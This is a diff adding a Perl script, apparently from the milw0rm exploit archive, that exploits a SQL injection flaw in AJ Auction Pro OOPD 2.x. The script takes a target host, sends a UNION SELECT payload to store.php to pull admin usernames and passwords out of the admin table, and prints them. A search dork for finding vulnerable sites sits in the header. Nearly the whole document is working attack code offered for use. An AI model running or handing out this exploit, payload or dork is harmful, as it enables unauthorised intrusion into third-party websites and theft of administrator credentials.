@@ -1,0 +1,53 @@
+#!/usr/bin/perl
+
+#********************************************************#
+#                                                        #
+# [o] AJ Auction Pro OOPD 2.x SQL Injection Exploit      #
+#      Software : AJ Auction Pro OOPD 2.x                #
+#      Vendor   : http://www.ajsquare.com/               #
+#      Author   : NoGe                                   #
+#      Contact  : noge[dot]code[at]gmail[dot]com         #
+#      Blog     : http://evilc0de.blogspot.com           #
+#                                                        #
+# [o] Usage                                              #
+#      root@noge:~# perl ajpro.pl www.target.com         #
+#                                                        #
+# [o] Dork                                               #
+#      "Powered By AJ Auction Pro"                       #
+#                                                        #
+# [o] Greetz                                             #
+#      MainHack BrotherHood [ http://mainhack.net ]      #
+#      Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang   #
+#      H312Y yooogy mousekill }^-^{ loqsa zxvf martfella #
+#      skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke     #
+#                                                        #
+#********************************************************#
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $target = $ARGV[0];
+my $file_vuln = '/store.php?id=';
+my $sql_query = '-null+union+select+1,2,3,4,5,group_concat(0x3a,user_name,0x3a,password,0x3a),7,8,9,10+from+admin--';
+print "\n[x]===============================================[x]\n";
+print "[x] AJ Auction Pro OOPD 2.x SQL Injection Exploit [x]\n";
+print "[x]                [C]oded By NoGe                [x]\n";
+print "[x]===============================================[x]\n\n";
+
+my $exploit = "http://".$target.$file_vuln.$sql_query;
+
+my $request   = HTTP::Request->new(GET=>$exploit);
+my $useragent = LWP::UserAgent->new();
+$useragent->timeout(10);
+my $response  = $useragent->request($request);
+if ($response->is_success) {
+my $res   = $response->content;
+if ($res =~ m/:(.*):(.*):/g) {
+my ($username,$password) = ($1,$2);
+print "[+] $username:$password \n\n";
+}
+else { print "[-] Error, Fail to get admin login.\n\n"; }
+}
+else { print "[-] Error, ".$response->status_line."\n\n"; }
+
+# milw0rm.com [2009-08-18]
